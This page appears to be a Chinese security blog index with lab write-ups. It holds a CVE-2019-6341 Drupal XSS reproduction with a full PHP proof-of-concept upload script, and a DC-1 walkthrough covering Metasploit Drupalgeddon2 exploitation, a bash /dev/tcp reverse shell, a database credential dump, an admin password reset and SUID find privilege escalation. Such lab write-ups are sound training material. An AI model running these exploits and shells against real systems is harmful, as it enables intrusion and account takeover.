<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="utf-8" />
   
  <meta name="keywords" content="生活,旅行,思考,代码,博客" />
   
  <meta name="description" content="一生努力" />
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
  <title>
     0Rld
  </title>
  <meta name="generator" content="hexo-theme-yilia-plus">
  
  <link rel="shortcut icon" href="/favicon.ico" />
  
  
<link rel="stylesheet" href="/css/style.css">

  
<script src="/js/pace.min.js"></script>


  

  

<link rel="alternate" href="/atom.xml" title="0Rld" type="application/atom+xml">
<link rel="stylesheet" href="/css/prism.css" type="text/css"></head>

</html>
<script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
<body>
  <div id="app">
    <main class="content">
      
<section class="cover">
    
  <div class="cover-frame">
    <div class="bg-box">
      <img src="/images/cover3.jpg" alt="image frame" />
    </div>
    <div class="cover-inner text-center text-white">
      <h1><a href="/">0Rld</a></h1>
      <div id="subtitle-box">
        
        <span id="subtitle"></span>
        
      </div>
      <div>
        
        <img
          src="/images/ayer.svg"
          class="cover-logo"
          alt="0Rld"
        />
        
      </div>
    </div>
  </div>
  <div class="cover-learn-more">
    <a href="javascript:void(0)" class="anchor"><i class="ri-arrow-down-line"></i></a>
  </div>
</section>



<script src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js"></script>

<div id="main">
  <section class="outer">
  <article class="articles">
    
    
    
    
    <article id="post-红队靶场系列" class="article article-type-post" itemscope
  itemprop="blogPost" data-scroll-reveal>

  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2020/10/09/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/"
    >红队靶场系列</a
  >
</h2>
  

    </header>
    

    
    <div class="article-meta">
      <a href="/2020/10/09/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/" class="article-date">
  <time datetime="2020-10-09T07:17:46.000Z" itemprop="datePublished">2020-10-09</time>
</a>
      
      
      
      
    </div>
    

    

    
    <div class="article-entry" itemprop="articleBody">
      


      

      
      
      
      <!-- reward -->
      
    </div>
    
    
      <!-- copyright -->
      
    <footer class="article-footer">
      
      

    </footer>

  </div>

  

  
  
  

  

</article>
    
    <article id="post-CVE-2019-6341" class="article article-type-post" itemscope
  itemprop="blogPost" data-scroll-reveal>

  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2020/09/23/CVE-2019-6341/"
    >CVE-2019-6341</a
  >
</h2>
  

    </header>
    

    
    <div class="article-meta">
      <a href="/2020/09/23/CVE-2019-6341/" class="article-date">
  <time datetime="2020-09-23T07:43:45.000Z" itemprop="datePublished">2020-09-23</time>
</a>
      
      
      
      
    </div>
    

    

    
    <div class="article-entry" itemprop="articleBody">
      


      

      
      <p>之前做靶场渗透的时候利用过drupal 7 的漏洞，发现了还有更新版本的漏洞，就复现下吧</p>
<p><strong>影响版本：</strong></p>
<p>在7.65之前的Drupal 7版本中； 8.6.13之前的Drupal 8.6版本; 8.5.14之前的Drupal 8.5版本。</p>
<p><strong>漏洞类型：</strong></p>
<p>XSS，漏洞等级中</p>
<p><strong>漏洞介绍：</strong></p>
<p>Drupal诞生于2000年，是一个<strong>基于PHP语言编写的开发型CMF（内容管理框架）</strong>。在某些情况下，<strong>通过文件模块或者子系统上传恶意文件触发XSS漏洞</strong></p>
<p>利用vulhub、docker很方便的搭建好环境</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/desktop/vulhub<span class="literal">-master</span>/drupal/CVE<span class="literal">-2019</span><span class="literal">-6341</span><span class="comment"># docker-compose up -d</span></span><br><span class="line">Creating network <span class="string">"cve-2019-6341_default"</span> with the default driver</span><br><span class="line">root@kali:~/desktop/vulhub<span class="literal">-master</span>/drupal/CVE<span class="literal">-2019</span><span class="literal">-6341</span><span class="comment"># php blog-poc.php 127.0.0.1 8080</span></span><br><span class="line"><span class="comment">#firefox等浏览器下是会直接过滤xss，可在ie下验证</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/23/CVE-2019-6341/2.png" alt></p>
<p><strong>原理分析：</strong></p>
<p>在Drupal的机制中，设定了这样一条规则。</p>
<p>用户上传的图片文件名将会被保留，<strong>如果出现文件名相同的情况，那么文件名后面就会被跟上<code>_0</code>,<code>_1</code>依次递增</strong>。</p>
<p>在Drupal中为了兼容各种编码，在处理上传文件名时，Drupal会对文件名对相应的处理，<strong>如果出现值小于<code>0x20</code>的字符，那么就会将其转化为<code>_</code></strong>。</p>
<p>具体代码如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">file_create_filename</span><span class="params">($basename,$directory)</span></span>&#123;</span><br><span class="line">	$basename=preg_replace(<span class="string">'/[\x00-\x1F]/u'</span>,<span class="string">'-'</span>,$basename);</span><br><span class="line">	<span class="keyword">if</span>(substr(PHP_OS,<span class="number">0</span>,<span class="number">3</span>)==<span class="string">'WIN'</span>)&#123;</span><br><span class="line">		$basename=str_replace([<span class="string">':'</span>,<span class="string">'*'</span>,<span class="string">'?'</span>,<span class="string">'"'</span>,<span class="string">'&lt;'</span>,<span class="string">'&gt;'</span>,<span class="string">'|'</span>],<span class="string">'_'</span>,$basename);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(substr($directory,<span class="number">-1</span>)==<span class="string">'/'</span>)&#123;</span><br><span class="line">	$separator=<span class="string">''</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但如果文件名中，如果出现了<code>\x80</code>到<code>\xff</code>的字符时，PHP就会抛出<code>PREG_BAD_UTF8_ERROR</code>，如果发生错误，那么<code>preg_replace</code>就会返回NULL，<code>$basename</code>就会被置为NULL</p>
<p>在这个基础下，原本会被上传到</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;sites&#x2F;default&#x2F;files&#x2F;pictures&#x2F;&lt;YYYY-MM&gt;&#x2F;</span><br></pre></td></tr></table></figure>

<p>则会被写入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;sites&#x2F;default&#x2F;files&#x2F;pictures&#x2F;&lt;YYYY-MM&gt;&#x2F;_0</span><br></pre></td></tr></table></figure>



<p>poc代码如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/desktop/vulhub-master/drupal/CVE<span class="number">-2019</span><span class="number">-6341</span><span class="comment"># cat blog-poc.php </span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$host = $argv[<span class="number">1</span>];</span><br><span class="line">$port = $argv[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">$pk =   <span class="string">"GET /user/register HTTP/1.1\r\n"</span>.</span><br><span class="line">        <span class="string">"Host: "</span>.$host.<span class="string">"\r\n"</span>.</span><br><span class="line">        <span class="string">"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"</span>.</span><br><span class="line">        <span class="string">"Accept-Language: en-US,en;q=0.5\r\n"</span>.</span><br><span class="line">        <span class="string">"Referer: http://"</span>.$host.<span class="string">"/user/login\r\n"</span>.</span><br><span class="line">        <span class="string">"Connection: close\r\n\r\n"</span>;</span><br><span class="line"></span><br><span class="line">$fp = fsockopen($host,$port,$e,$err,<span class="number">1</span>); <span class="comment">#远程连接</span></span><br><span class="line"><span class="keyword">if</span> (!$fp) &#123;<span class="keyword">die</span>(<span class="string">"not connected"</span>);&#125;</span><br><span class="line">fputs($fp,$pk);</span><br><span class="line">$out=<span class="string">""</span>;</span><br><span class="line"><span class="keyword">while</span> (!feof($fp))&#123;</span><br><span class="line">  $out.=fread($fp,<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">fclose($fp);</span><br><span class="line"></span><br><span class="line">preg_match(<span class="string">'/name="form_build_id" value="(.*)"/'</span>, $out, $match);</span><br><span class="line">$formid = $match[<span class="number">1</span>];</span><br><span class="line"><span class="comment">//var_dump($formid);</span></span><br><span class="line"><span class="comment">//echo "form id is:". $formid;</span></span><br><span class="line"><span class="comment">//echo $out."\n";</span></span><br><span class="line">sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">$data = </span><br><span class="line"><span class="string">"Content-Type: multipart/form-data; boundary=---------------------------60928216114129559951791388325\r\n"</span>.</span><br><span class="line"><span class="string">"Connection: close\r\n"</span>.</span><br><span class="line"><span class="string">"\r\n"</span>.</span><br><span class="line"><span class="string">"-----------------------------60928216114129559951791388325\r\n"</span>.</span><br><span class="line"><span class="string">"Content-Disposition: form-data; name=\"mail\"\r\n"</span>.</span><br><span class="line"><span class="string">"\r\n"</span>.</span><br><span class="line"><span class="string">"test324@example.com\r\n"</span>.</span><br><span class="line"><span class="string">"-----------------------------60928216114129559951791388325\r\n"</span>.</span><br><span class="line"><span class="string">"Content-Disposition: form-data; name=\"name\"\r\n"</span>.</span><br><span class="line"><span class="string">"\r\n"</span>.</span><br><span class="line"><span class="string">"test2345\r\n"</span>.</span><br><span class="line"><span class="string">"-----------------------------60928216114129559951791388325\r\n"</span>.</span><br><span class="line"><span class="string">"Content-Disposition: form-data; name=\"files[user_picture_0]\"; filename=\"xxx\xc0.gif\"\r\n"</span>.</span><br><span class="line"><span class="string">"Content-Type: image/gif\r\n"</span>.</span><br><span class="line"><span class="string">"\r\n"</span>.</span><br><span class="line"><span class="string">"GIF\r\n"</span>.</span><br><span class="line"><span class="string">"&lt;HTML&gt;\r\n"</span>.</span><br><span class="line"><span class="string">"       &lt;HEAD&gt;\r\n"</span>.</span><br><span class="line"><span class="string">"               &lt;SCRIPT&gt;alert(123);&lt;/SCRIPT&gt;\r\n"</span>.</span><br><span class="line"><span class="string">"       &lt;/HEAD&gt;\r\n"</span>.</span><br><span class="line"><span class="string">"       &lt;BODY&gt;\r\n"</span>.</span><br><span class="line"><span class="string">"       &lt;/BODY&gt;\r\n"</span>.</span><br><span class="line"><span class="string">"&lt;/HTML&gt;\r\n"</span>.</span><br><span class="line"><span class="string">"-----------------------------60928216114129559951791388325\r\n"</span>.</span><br><span class="line"><span class="string">"Content-Disposition: form-data; name=\"user_picture[0][fids]\"\r\n"</span>.</span><br><span class="line"><span class="string">"\r\n"</span>.</span><br><span class="line"><span class="string">"\r\n"</span>.</span><br><span class="line"><span class="string">"-----------------------------60928216114129559951791388325\r\n"</span>.</span><br><span class="line"><span class="string">"Content-Disposition: form-data; name=\"user_picture[0][display]\"\r\n"</span>.</span><br><span class="line"><span class="string">"\r\n"</span>.</span><br><span class="line"><span class="string">"1\r\n"</span>.</span><br><span class="line"><span class="string">"-----------------------------60928216114129559951791388325\r\n"</span>.</span><br><span class="line"><span class="string">"Content-Disposition: form-data; name=\"form_build_id\"\r\n"</span>.</span><br><span class="line"><span class="string">"\r\n"</span>.</span><br><span class="line"><span class="comment">//"form-KyXRvDVovOBjofviDPTw682MQ8Bf5es0PyF-AA2Buuk\r\n".</span></span><br><span class="line">$formid.<span class="string">"\r\n"</span>.</span><br><span class="line"><span class="string">"-----------------------------60928216114129559951791388325\r\n"</span>.</span><br><span class="line"><span class="string">"Content-Disposition: form-data; name=\"form_id\"\r\n"</span>.</span><br><span class="line"><span class="string">"\r\n"</span>.</span><br><span class="line"><span class="string">"user_register_form\r\n"</span>.</span><br><span class="line"><span class="string">"-----------------------------60928216114129559951791388325\r\n"</span>.</span><br><span class="line"><span class="string">"Content-Disposition: form-data; name=\"contact\"\r\n"</span>.</span><br><span class="line"><span class="string">"\r\n"</span>.</span><br><span class="line"><span class="string">"1\r\n"</span>.</span><br><span class="line"><span class="string">"-----------------------------60928216114129559951791388325\r\n"</span>.</span><br><span class="line"><span class="string">"Content-Disposition: form-data; name=\"timezone\"\r\n"</span>.</span><br><span class="line"><span class="string">"\r\n"</span>.</span><br><span class="line"><span class="string">"America/New_York\r\n"</span>.</span><br><span class="line"><span class="string">"-----------------------------60928216114129559951791388325\r\n"</span>.</span><br><span class="line"><span class="string">"Content-Disposition: form-data; name=\"_triggering_element_name\"\r\n"</span>.</span><br><span class="line"><span class="string">"\r\n"</span>.</span><br><span class="line"><span class="string">"user_picture_0_upload_button\r\n"</span>.</span><br><span class="line"><span class="string">"-----------------------------60928216114129559951791388325\r\n"</span>.</span><br><span class="line"><span class="string">"Content-Disposition: form-data; name=\"_triggering_element_value\"\r\n"</span>.</span><br><span class="line"><span class="string">"\r\n"</span>.</span><br><span class="line"><span class="string">"Upload\r\n"</span>.</span><br><span class="line"><span class="string">"-----------------------------60928216114129559951791388325\r\n"</span>.</span><br><span class="line"><span class="string">"Content-Disposition: form-data; name=\"_drupal_ajax\"\r\n"</span>.</span><br><span class="line"><span class="string">"\r\n"</span>.</span><br><span class="line"><span class="string">"1\r\n"</span>.</span><br><span class="line"><span class="string">"-----------------------------60928216114129559951791388325\r\n"</span>.</span><br><span class="line"><span class="string">"Content-Disposition: form-data; name=\"ajax_page_state[theme]\"\r\n"</span>.</span><br><span class="line"><span class="string">"\r\n"</span>.</span><br><span class="line"><span class="string">"bartik\r\n"</span>.</span><br><span class="line"><span class="string">"-----------------------------60928216114129559951791388325\r\n"</span>.</span><br><span class="line"><span class="string">"Content-Disposition: form-data; name=\"ajax_page_state[theme_token]\"\r\n"</span>.</span><br><span class="line"><span class="string">"\r\n"</span>.</span><br><span class="line"><span class="string">"\r\n"</span>.</span><br><span class="line"><span class="string">"-----------------------------60928216114129559951791388325\r\n"</span>.</span><br><span class="line"><span class="string">"Content-Disposition: form-data; name=\"ajax_page_state[libraries]\"\r\n"</span>.</span><br><span class="line"><span class="string">"\r\n"</span>.</span><br><span class="line"><span class="string">"bartik/global-styling,classy/base,classy/messages,core/drupal.ajax,core/drupal.collapse,core/drupal.timezone,core/html5shiv,core/jquery.form,core/normalize,file/drupal.file,system/base\r\n"</span>.</span><br><span class="line"><span class="string">"-----------------------------60928216114129559951791388325--\r\n"</span>;</span><br><span class="line"></span><br><span class="line">$pk =   <span class="string">"POST /user/register?element_parents=user_picture/widget/0&amp;ajax_form=1&amp;_wrapper_format=drupal_ajax HTTP/1.1\r\n"</span>.</span><br><span class="line">        <span class="string">"Host: "</span>.$host.<span class="string">"\r\n"</span>.</span><br><span class="line">        <span class="string">"User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0\r\n"</span>.</span><br><span class="line">        <span class="string">"Accept: application/json, text/javascript, */*; q=0.01\r\n"</span>.</span><br><span class="line">        <span class="string">"Accept-Language: en-US,en;q=0.5\r\n"</span>.</span><br><span class="line">        <span class="string">"X-Requested-With: XMLHttpRequest\r\n"</span>.</span><br><span class="line">        <span class="string">"Referer: http://"</span> .$host. <span class="string">"/user/register\r\n"</span>.</span><br><span class="line">        <span class="string">"Content-Length: "</span>. strlen($data). <span class="string">"\r\n"</span>.</span><br><span class="line">        $data;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"uploading file, please wait...\n"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ($i =<span class="number">1</span>; $i &lt;= <span class="number">2</span>; $i++)&#123;</span><br><span class="line">$fp = fsockopen($host,$port,$e,$err,<span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span> (!$fp) &#123;<span class="keyword">die</span>(<span class="string">"not connected"</span>);&#125;</span><br><span class="line">fputs($fp,$pk); <span class="comment">#将pk字符串，写入fp文件中</span></span><br><span class="line">$out=<span class="string">""</span>;</span><br><span class="line"><span class="keyword">while</span> (!feof($fp))&#123;</span><br><span class="line">  $out.=fread($fp,<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">fclose($fp);</span><br><span class="line"></span><br><span class="line"><span class="comment">// echo "Got ".$i."/2 500 errors\n";</span></span><br><span class="line"><span class="comment">// echo $out."\n";</span></span><br><span class="line">sleep(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"please check /var/www/html/drupal/sites/default/files/pictures/YYYY-MM\n"</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>


      
      <!-- reward -->
      
    </div>
    
    
      <!-- copyright -->
      
    <footer class="article-footer">
      
      

    </footer>

  </div>

  

  
  
  

  

</article>
    
    <article id="post-DC靶场系列" class="article article-type-post" itemscope
  itemprop="blogPost" data-scroll-reveal>

  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2020/09/12/DC%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/"
    >DC靶场系列</a
  >
</h2>
  

    </header>
    

    
    <div class="article-meta">
      <a href="/2020/09/12/DC%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/" class="article-date">
  <time datetime="2020-09-12T13:26:08.000Z" itemprop="datePublished">2020-09-12</time>
</a>
      
      
      
      
    </div>
    

    

    
    <div class="article-entry" itemprop="articleBody">
      


      

      
      <h2 id="DC-1渗透过程"><a href="#DC-1渗透过程" class="headerlink" title="DC-1渗透过程"></a><strong>DC-1渗透过程</strong></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l <span class="comment">#发现主机ip</span></span><br><span class="line">nmap -sV -A <span class="number">192.168</span><span class="number">.126</span><span class="number">.141</span> <span class="comment">#详细端口服务扫描</span></span><br><span class="line"><span class="comment">###发现了80端口是drupal7 服务，开启msf查找漏洞</span></span><br><span class="line">msf5 &gt; search drupal</span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line">   <span class="comment">#  Name                                           Disclosure Date  Rank       Check  Description</span></span><br><span class="line">   -  ----                                           ---------------  ----       -----  -----------</span><br><span class="line">   <span class="number">0</span>  auxiliary/gather/drupal_openid_xxe             <span class="number">2012</span><span class="number">-10</span><span class="number">-17</span>       normal     Yes    Drupal OpenID External Entity Injection</span><br><span class="line">   <span class="number">4</span>  exploit/unix/webapp/drupal_drupalgeddon2       <span class="number">2018</span><span class="number">-03</span><span class="number">-28</span>       excellent  Yes    Drupal Drupalgeddon <span class="number">2</span> Forms API Property Injection</span><br><span class="line"></span><br><span class="line">msf5 &gt; use exploit/unix/webapp/drupal_drupalgeddon2 </span><br><span class="line">msf5 exploit(unix/webapp/drupal_drupalgeddon2) &gt; set rhosts <span class="number">192.168</span><span class="number">.126</span><span class="number">.153</span></span><br><span class="line">rhosts =&gt; 192.168.126.153</span><br><span class="line">msf5 exploit(unix/webapp/drupal_drupalgeddon2) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on <span class="number">192.168</span><span class="number">.126</span><span class="number">.33</span>:<span class="number">4444</span> </span><br><span class="line">meterpreter &gt; </span><br><span class="line"><span class="comment">#成功进入目标服务器，为稳定连接，可以反弹shell到本地</span></span><br><span class="line">python -c <span class="string">"import pty;pty.spawn('/bin/bash')"</span>  <span class="comment">#获取交互shell</span></span><br><span class="line">www-data@DC<span class="number">-1</span>:/var/www$ bash -i &amp;&gt; /dev/tcp/<span class="number">192.168</span><span class="number">.126</span><span class="number">.33</span>/<span class="number">2333</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span> <span class="comment">#反弹bash</span></span><br><span class="line">root@kali:~<span class="comment"># nc -lvp 2333 #本地监听</span></span><br><span class="line">listening on [any] <span class="number">2333</span> ...</span><br><span class="line"><span class="number">192.168</span><span class="number">.126</span><span class="number">.153</span>: inverse host lookup failed: Host name lookup failure</span><br><span class="line">connect to [<span class="number">192.168</span><span class="number">.126</span><span class="number">.33</span>] <span class="keyword">from</span> (UNKNOWN) [<span class="number">192.168</span><span class="number">.126</span><span class="number">.153</span>] <span class="number">51022</span></span><br><span class="line">www-data@DC<span class="number">-1</span>:/var/www$ python -c <span class="string">"import pty;pty.spawn('/bin/bash')"</span> <span class="comment">#这里再反弹一个更稳定</span></span><br></pre></td></tr></table></figure>

<p><strong>本地发现flag1、提示查看数据库配置文件，发现flag2，给了数据库的账号密码，连接数据库看看</strong></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">www<span class="literal">-data</span>@DC<span class="literal">-1</span>:/var/www<span class="variable">$</span> mysql <span class="literal">-u</span> dbuser <span class="literal">-p</span>  <span class="comment">#连接数据库</span></span><br><span class="line">Enter password: R0ck3t</span><br><span class="line">mysql&gt; show databases;  </span><br><span class="line">show databases;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| drupaldb           |</span><br><span class="line">+--------------------+</span><br><span class="line"><span class="number">2</span> rows <span class="keyword">in</span> set (<span class="number">0.00</span> sec)</span><br><span class="line">mysql&gt; select * from users \G;</span><br><span class="line">select * from users \G;</span><br><span class="line">*************************** <span class="number">2</span>. row ***************************</span><br><span class="line">             uid: <span class="number">1</span></span><br><span class="line">            name: admin</span><br><span class="line">            pass: <span class="variable">$S</span><span class="variable">$DvQI6Y600iNeXRIeEMF94Y6FvN8nujJcEDTCP9nS5</span>.i38jnEKuDR</span><br><span class="line">            mail: admin@example.com</span><br><span class="line">           theme: </span><br><span class="line">       signature: </span><br><span class="line">signature_format: NULL</span><br><span class="line">         created: <span class="number">1550581826</span></span><br><span class="line">          access: <span class="number">1550583852</span></span><br><span class="line">           login: <span class="number">1550582362</span></span><br><span class="line">          status: <span class="number">1</span></span><br><span class="line">        timezone: Australia/Melbourne</span><br><span class="line">        language: </span><br><span class="line">         picture: <span class="number">0</span></span><br><span class="line">            init: admin@example.com</span><br><span class="line">            <span class="keyword">data</span>: b:<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">###修改数据库admin的密码，这里用自带的hash加密求hash值</span></span><br><span class="line">www<span class="literal">-data</span>@DC<span class="literal">-1</span>:/var/www<span class="variable">$</span> php scripts/password<span class="literal">-hash</span>.sh <span class="number">123456</span></span><br><span class="line">password: <span class="number">123456</span>                hash: <span class="variable">$S</span><span class="variable">$DvvyyPuAd4L6M</span>/fZV0kmnokciLomH5YSvUZ.w.aaALZpqe1zMTtV</span><br><span class="line"><span class="comment">#更新数据库密码</span></span><br><span class="line">update users set pass=<span class="string">'$S$DRP9A87VYWMUnTb4Dl7yivYAlibCNONO32cCB3Qc1LT5Alr90rAu'</span> where uid=<span class="number">1</span>;</span><br><span class="line"><span class="comment">#登陆网页发现flag3，提示查看/etc/passwd</span></span><br><span class="line"><span class="comment">#提权，寻找有suid权限的文件</span></span><br><span class="line">find / <span class="literal">-perm</span> <span class="literal">-u</span>=s <span class="literal">-type</span> f <span class="number">2</span>&gt;/dev/null</span><br><span class="line">find / <span class="literal">-perm</span> /<span class="number">4000</span> <span class="number">2</span>&gt;/dev/null</span><br><span class="line">touch test <span class="comment"># 创建一个空文件</span></span><br><span class="line">find test <span class="literal">-exec</span> <span class="string">'whoami'</span> \; <span class="comment">#查看是否提权</span></span><br><span class="line">find test <span class="literal">-exec</span> <span class="string">'/bin/sh'</span> \;<span class="comment">#将root的bash反弹</span></span><br><span class="line"><span class="comment">#cd /root 找到最终的flag文件</span></span><br><span class="line">cat final<span class="literal">-flag</span>.txt</span><br><span class="line"> __    __     _ _       _                    _ </span><br><span class="line">/ / /\ \ \___| | |   __| | ___  _ __   ___  / \</span><br><span class="line">\ \/  \/ / _ \ | |  / _` |/ _ \| <span class="string">'_ \ / _ \/  /</span></span><br><span class="line"><span class="string"> \  /\  /  __/ | | | (_| | (_) | | | |  __/\_/ </span></span><br><span class="line"><span class="string">  \/  \/ \___|_|_|  \__,_|\___/|_| |_|\___\/   </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Congratulatons!!!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">A special thanks to all those who sent me tweets</span></span><br><span class="line"><span class="string">and provided me with feedback - it'</span>s all greatly</span><br><span class="line">appreciated.</span><br></pre></td></tr></table></figure>

<hr>
